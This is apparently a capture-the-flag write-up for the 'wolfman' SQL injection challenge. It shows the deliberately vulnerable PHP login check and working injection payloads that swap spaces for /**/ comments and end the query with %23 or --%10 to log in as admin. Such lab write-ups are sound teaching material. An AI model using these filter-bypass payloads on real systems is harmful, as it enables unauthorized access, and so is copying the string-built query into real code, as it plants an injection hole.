# wolfman

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

No whitespaces, very interesting. With a quick google search, I find [Can you write a sql statement without spaces between keywords](https://stackoverflow.com/questions/37167239/can-you-write-a-sql-statement-without-spaces-between-keywords). It says that I can use comment `/**/` instead of spaces. So I tried

```
pw='/**/or/**/'1'='1
```

That results in 

```
select id from prob_wolfman where id='guest' and pw=''/**/or/**/'1'='1'

Hello guest
```

Now I only need to comment the last quotes. Previously, I used double dashes followed by a space `-- -`, but since space is forbidden, from the [MySQL Comments Documentation](https://dev.mysql.com/doc/refman/8.2/en/comments.html), I can use `#` or `--[control character]`. At first, I used 

```
pw='/**/or/**/id='admin'--%10-
```

Then I tried

```
pw='/**/or/**/id='admin'%23
```

Both returns a success.